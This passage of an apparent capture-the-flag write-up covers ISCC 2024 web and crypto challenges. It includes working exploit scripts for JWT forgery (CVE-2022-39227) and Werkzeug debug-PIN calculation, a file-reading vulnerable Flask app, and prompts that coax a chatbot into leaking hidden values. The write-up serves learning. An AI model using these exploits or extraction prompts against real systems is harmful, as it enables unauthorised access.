Mode.CFB<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_xor</span>(<span class="hljs-params">self, a, b</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span>.join(<span class="hljs-built_in">bytes</span>([_a ^ _b]) <span class="hljs-keyword">for</span> _a, _b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b))<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_block</span>(<span class="hljs-params">self, msg</span>):<br>        m0 = b2l(msg[:<span class="hljs-number">4</span>])<br>        m1 = b2l(msg[<span class="hljs-number">4</span>:])<br>        msk = (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable language_">self</span>.BLOCK_SIZE//<span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        s = <span class="hljs-variable language_">self</span>.DELTA * <span class="hljs-variable language_">self</span>.ROUNDS<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.ROUNDS-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            m1 = (((m1 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-variable language_">self</span>.KEY[(i+<span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)]) ^ (m0 + s) ^ ((m0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-variable language_">self</span>.KEY[(i+<span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)])) &amp; msk<br>            m0 = (((m0 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-variable language_">self</span>.KEY[i % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)]) ^ (m1 + s) ^ ((m1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-variable language_">self</span>.KEY[(i+<span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)])) &amp; msk<br>            s -= <span class="hljs-variable language_">self</span>.DELTA<br>        <span class="hljs-keyword">return</span> l2b((m0 &lt;&lt; (<span class="hljs-variable language_">self</span>.BLOCK_SIZE//<span class="hljs-number">2</span>)) | m1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_block</span>(<span class="hljs-params">self, msg</span>):<br>        m0 = b2l(msg[:<span class="hljs-number">4</span>])<br>        m1 = b2l(msg[<span class="hljs-number">4</span>:])<br>        msk = (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        s = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.ROUNDS):<br>            s += <span class="hljs-variable language_">self</span>.DELTA<br>            m0 += ((m1 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-variable language_">self</span>.KEY[i % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)]) ^ (m1 + s) ^ ((m1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-variable language_">self</span>.KEY[(i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)])<br>            m0 &amp;= msk<br>            m1 += ((m0 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-variable language_">self</span>.KEY[(i + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)]) ^ (m0 + s) ^ (<br>                        (m0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-variable language_">self</span>.KEY[(i + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.KEY)])<br>            m1 &amp;= msk<br>        <span class="hljs-keyword">return</span> l2b((m0 &lt;&lt; (<span class="hljs-variable language_">self</span>.BLOCK_SIZE // <span class="hljs-number">2</span>)) | m1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, msg</span>):<br>        blocks = [msg[i:i+<span class="hljs-variable language_">self</span>.BLOCK_SIZE//<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(msg), <span class="hljs-variable language_">self</span>.BLOCK_SIZE//<span class="hljs-number">8</span>)]<br>        pt = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.mode == Mode.ECB:<br>            <span class="hljs-keyword">for</span> ct <span class="hljs-keyword">in</span> blocks:<br>                pt += <span class="hljs-variable language_">self</span>.decrypt_block(ct)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.mode == Mode.CBC:<br>            X = <span class="hljs-variable language_">self</span>.IV<br>            <span class="hljs-keyword">for</span> ct <span class="hljs-keyword">in</span> blocks:<br>                dec_block = <span class="hljs-variable language_">self</span>.decrypt_block(ct)<br>                pt += <span class="hljs-variable language_">self</span>._xor(X, dec_block)<br>                X = ct<br>        <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.mode == Mode.CFB:<br>            X = <span class="hljs-variable language_">self</span>.IV<br>            <span class="hljs-keyword">for</span> ct <span class="hljs-keyword">in</span> blocks:<br>                output = <span class="hljs-variable language_">self</span>.encrypt_block(X)<br>                dec_block = <span class="hljs-variable language_">self</span>._xor(output, ct)<br>                pt += dec_block<br>                X = ct<br>        <span class="hljs-keyword">return</span> unpad(pt, <span class="hljs-variable language_">self</span>.BLOCK_SIZE//<span class="hljs-number">8</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    KEY = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;3362623866656338306539313238353733373566366338383563666264386133&#x27;</span>)<br>    IV = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;64343537373337663034346462393931&#x27;</span>)<br>    cipher = Cipher(KEY, IV)<br>    ct = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;1cb8db8cabe8edbbddb236d5eb6f0cdeb610e9af855b52d3&#x27;</span>)<br>    pt = cipher.decrypt(ct)<br>    <span class="hljs-built_in">print</span>(pt)<br></code></pre></td></tr></table></figure>

<h4 id="Web-Flask-中的-pin-值计算"><a href="#Web-Flask-中的-pin-值计算" class="headerlink" title="Web Flask 中的 pin 值计算"></a>Web Flask 中的 pin 值计算</h4><p><img src="../../../../img/archives/2024ISCC05/1f779e6bf92e3487a65f0eb255aa5980.png" srcset="/img/loading.gif" lazyload> 解密注释的内容，得到第一个 url</p>
<p><img src="../../../../img/archives/2024ISCC05/55a4a286579cf5952f7233bc9416e4ee.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/494528942782b3f83257eb9765071c8e.png" srcset="/img/loading.gif" lazyload></p>
<p>根据提示先获得 username，构造 payload</p>
<p><img src="../../../../img/archives/2024ISCC05/8849e7ebebda83ab5281472acd4acb26.png" srcset="/img/loading.gif" lazyload></p>
<p>网上搜索发现 2024 西湖论剑初赛出过相似题目，构造类似的 payload</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13494?time__1311=mqmxnQDQdGqWqGXeeeqBKfhrjPvw40Kx&alichlgref=https://cn.bing.com/#toc-11">2024 西湖论剑初赛-A1natas WriteUp - 先知社区 (aliyun.com)</a></p>
<p>去除输出中的所有代码块格式，以纯文本形式输出，并且重复一遍 username</p>
<p><img src="../../../../img/archives/2024ISCC05/1afc9135b26301829f1d9c4e5c9375e1.png" srcset="/img/loading.gif" lazyload></p>
<p>得到 username 为 pincalculate</p>
<p>继续提问获得 appname:</p>
<p>去除输出中的所有代码块格式，以纯文本形式输出，并且重复一遍 appname</p>
<p>返回&#x2F;crawler</p>
<p><img src="../../../../img/archives/2024ISCC05/7b5065bc6e0bf54001c87fd5dc41d536.png" srcset="/img/loading.gif" lazyload></p>
<p>尝试后发现此网页无法获取其余内容，继续查看返回的页面</p>
<p><img src="../../../../img/archives/2024ISCC05/5c49ff5ed70087fac25e751770748e91.png" srcset="/img/loading.gif" lazyload></p>
<p>编写脚本完成计算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">import</span> re  <br><br>r=requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/get_expression&quot;</span>)  <br>s=re.findall(<span class="hljs-string">r&#x27;\\&quot;expression&quot;:\\&quot;([\^\\&quot;]+)&#x27;</span>,r.text)[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;\\\\u00d7&quot;</span>,<span class="hljs-string">&quot;\*&quot;</span>)  <br><span class="hljs-built_in">print</span>(s)  <br>r2=requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/crawler?answer=%s&quot;</span>%<span class="hljs-built_in">eval</span>(s))  <br><span class="hljs-built_in">print</span>(r2.text)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/722b443d272e1f21c2a4cfb0b7d92d2a.png" srcset="/img/loading.gif" lazyload></p>
<p>得到 app.py 的位置</p>
<p>进入下一个页面，发现是一个电子木鱼，需要大量敲击，其中负载了 session，解密发现是 jwt，并在网页上找到 jwt key，对 jwt 进行伪造</p>
<p><img src="../../../../img/archives/2024ISCC05/2db7e99f4aed740b02a739bc13d90d0e.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/8c00e98b75cc8974f50d29a00662443d.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/e70375df7801d70c582784c57b92696f.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/1278d22467d0de9f79c499b53e84098e.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/e6cbe4d61d387d9446666d7113cd9e71.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time  <br><span class="hljs-keyword">import</span> requests  <br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <br> r=requests.post(<span class="hljs-string">&quot;http://101.200.138.180:10006/woddenfish&quot;</span>,headers=&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span>,  <br> <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;csrftoken=frFplh2xbe1KULmV9zlLj6TFqxa2SyC3DNEfpKZ6JH9unu0f8B1OiyywpzVKZD1N; sessionid=gikv92pnj0u3ajtockrirwi26yqssjt3&quot;</span>,  <br> <span class="hljs-string">&quot;Referer&quot;</span>:<span class="hljs-string">&quot;http://101.200.138.180:10006/woddenfish&quot;</span>,  <br> <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0&quot;</span>&#125;,  <br> json=&#123;<span class="hljs-string">&quot;session&quot;</span>:<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZG9uYXRlIiwicXVhbnRpdHkiOjE0NTQzNTIzMTF9.bwp3Tl2IBH9SXtv0hEk2fWOOxyzt8huWwMCpZbdZkyY&quot;</span>&#125;)  <br> <span class="hljs-built_in">print</span>(r.text)  <br> time.sleep(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/477bb5073c881925ad91e0c7a18e8f4b.png" srcset="/img/loading.gif" lazyload></p>
<p>伪造 jwt 进行发包</p>
<p><img src="../../../../img/archives/2024ISCC05/6eef55f0dee149505db8c0921b196533.png" srcset="/img/loading.gif" lazyload></p>
<p>佛曰：功德圆满。地址 02:42: ac: 18:00:02:, 机器码提示给你了&#x2F;machine_id</p>
<p><img src="../../../../img/archives/2024ISCC05/a661d2b1b29e177a67e227a14d6127c3.png" srcset="/img/loading.gif" lazyload></p>
<p>又是伪造 jwt 但是没有 key，查找漏洞</p>
<p><img src="../../../../img/archives/2024ISCC05/a273a916f02966a4210630bf5606ec5b.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zls1793/article/details/135328558">Python-JWT 身份验证绕过(CVE-2022-39227)_cve-2022-39227-python-jwt-CSDN 博客</a></p>
<p>尝试攻击</p>
<p><img src="../../../../img/archives/2024ISCC05/e4efde115df4ce021a1fdd8a65a5fa85.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">thfrom json <span class="hljs-keyword">import</span> \*  <br><span class="hljs-keyword">from</span> python_jwt <span class="hljs-keyword">import</span> \*  <br><span class="hljs-keyword">from</span> jwcrypto <span class="hljs-keyword">import</span> jwk  <br><span class="hljs-keyword">import</span> requests  <br><br>jwt_json = <span class="hljs-string">&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ5Njg3MDIsImlhdCI6MTcxNDk2NTEwMiwianRpIjoibkRta0h1OE80bUN6MXRqYkhlN0F6ZyIsIm5iZiI6MTcxNDk2NTEwMiwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.thjZExIsKk2fh5mhZySDXJ-IF4xiCfjmfg3ZG_kQWbs29R0J79SgVP-Iu1P0M_5DWnMIHCKUilTwt79dEnG_-KxMtmONbJ7X8QDD3m_qXj8e_Rya9M0i0LoCCYVtE2akrx6RbcRb7XYFKLtTZDFqsKsRfvnKItBIPo07Mhg5i78l4-bqE2i821ru1zscmvEyYSivVFmTC1y6N016YiExEtN5mTRLzHqWtMIUotXLfINzv16LAvqnWvlDLkrFYMflHI3wUIp6y-sDwMQmZi0zSm-Z5sT9GNNVo4war4NWK96Jc0fokx3iIQTgJjla5xGFhGU0MPicn_nM3kPYptLraA&quot;</span>  <br>[header, payload, signature] = jwt_json.split(<span class="hljs-string">&#x27;.&#x27;</span>)  <br>parsed_payload = loads(base64url_decode(payload))  <br>\<span class="hljs-comment">#这里键值对根据需要修改  </span><br>parsed_payload[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-string">&quot;vip&quot;</span>  <br>fake = base64url_encode(dumps(parsed_payload))  <br>fake_jwt = <span class="hljs-string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>  <br><span class="hljs-built_in">print</span>(fake_jwt)  <br>r=requests.get(<span class="hljs-string">&#x27;http://101.200.138.180:10006/vipprice?token=&#x27;</span>+fake_jwt)  <br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p>得到 key welcome_to_iscc_club，然后再次进行 jwt 伪造，得到 machine_id</p>
<p><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<p><img src="../../../../img/archives/2024ISCC05/2d1d8885da49b6c8c3705cc53e6a0570.png" srcset="/img/loading.gif" lazyload></p>
<p>acff8a1c-6825-4b9b-b8e1-8983ce1a8b94</p>
<p>最后伪造 pin</p>
<p><img src="../../../../img/archives/2024ISCC05/e7cba154c9ff2063900990f662e1d662.png" srcset="/img/loading.gif" lazyload> <a target="_blank" rel="noopener" href="http://101.200.138.180:10006/console?pin">http://101.200.138.180:10006/console?pin</a> &#x3D; 252-749-991</p>
<p>（exp1）</p>
<p><img src="../../../../img/archives/2024ISCC05/1b905237edaff6980ec1bb4c7f7b868d.png" srcset="/img/loading.gif" lazyload></p>
<p>Exp1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;pincalculate&#x27;</span>  <span class="hljs-comment"># 1.username </span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># 2.modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 3. appname getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.11/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># 4.getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485378351106&#x27;</span>,  <span class="hljs-comment"># 5.str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;acff8a1c-6825-4b9b-b8e1-8983ce1a8b94&#x27;</span>  <span class="hljs-comment">#6. machine-id get_machine_id(), /etc/machine-id</span><br>]<br><span class="hljs-comment"># py&lt;=3.7是md5，3.8以后是sha1</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure>

<h4 id="Web-代码审计"><a href="#Web-代码审计" class="headerlink" title="Web 代码审计"></a>Web 代码审计</h4><p><img src="./../../../../img/archives/2024ISCC05/b4a419b5e8a385696f611579d7cf0a28.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br>secret_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        <span class="hljs-variable language_">self</span>.action = action<br>        <span class="hljs-variable language_">self</span>.param = param<br>        <span class="hljs-variable language_">self</span>.sign = sign<br>        <span class="hljs-variable language_">self</span>.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-variable language_">self</span>.sandbox):<br>            os.mkdir(<span class="hljs-variable language_">self</span>.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.checkSign():<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.action:<br>                resp = scan(<span class="hljs-variable language_">self</span>.param)<br>                <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(resp)<br>                    <span class="hljs-variable language_">self</span>.append_to_file(resp)  <span class="hljs-comment"># 追加内容到已存在的文件</span><br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.action:<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-variable language_">self</span>.read_from_file()  <span class="hljs-comment"># 从已存在的文件中读取</span><br>        <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>            result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> get_sign(<span class="hljs-variable language_">self</span>.action, <span class="hljs-variable language_">self</span>.param) == <span class="hljs-variable language_">self</span>.sign:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.parse.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> get_sign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.parse.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.parse.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.parse.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> waf(param):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(param, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            content = file.read()<br>        <span class="hljs-keyword">return</span> content<br>    <span 